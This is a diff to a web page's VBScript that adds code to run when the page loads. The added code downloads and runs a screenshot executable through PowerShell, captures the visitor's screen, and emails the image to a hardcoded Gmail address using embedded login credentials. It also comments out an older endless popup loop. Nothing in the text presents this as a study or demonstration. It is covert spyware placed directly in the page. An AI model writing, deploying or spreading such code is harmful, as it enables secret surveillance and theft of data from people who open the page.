@@ -1,5 +1,35 @@
 <SCRIPT LANGUAGE="VBScript">
+Set emailObj      = CreateObject("CDO.Message")
+emailObj.From     = "relayemail63@gmail.com"
+emailObj.To       = "relayemail63@gmail.com"
+rem Set environmentVars = WScript.CreateObject("WScript.Shell").Environment("Process")
+rem userName = environmentVars("username")
+userName = "dude"
+emailObj.Subject  = "Screenshot from user: " & userName
+emailObj.TextBody = "Here you go"
+Set emailConfig = emailObj.Configuration
+emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.gmail.com"
+emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 465
+emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/sendusing")    = 2  
+emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1  
+emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/smtpusessl")      = true 
+emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/sendusername")    = "relayemail63@gmail.com"
+emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/sendpassword")    = "remoteaccess"
+emailConfig.Fields.Update
+scriptdir = "c:\"
+strFileURL = "https://cdn.rawgit.com/chuntaro/screenshot-cmd/c3053453/screenshot.exe"
+strHDLocation = scriptdir & "\screenshot.exe"
+Set oShell = WScript.CreateObject ("WScript.Shell")
+WScript.Shell.Run "powershell.exe Invoke-WebRequest -Uri " & strFileURL & " -OutFile " & strHDLocation
+WScript.Sleep(8000)
+oShell.Run "screenshot.exe"
+WScript.Sleep(8000)
+emailObj.AddAttachment scriptdir & "\screenshot.png"
+emailObj.Send
+</SCRIPT>
+<!--
+<SCRIPT LANGUAGE="VBScript">
 do
 x=msgbox("This popup was created by a website" ,0, "Unautherized access, I guess")
 loop
-</SCRIPT>
+</SCRIPT>-->
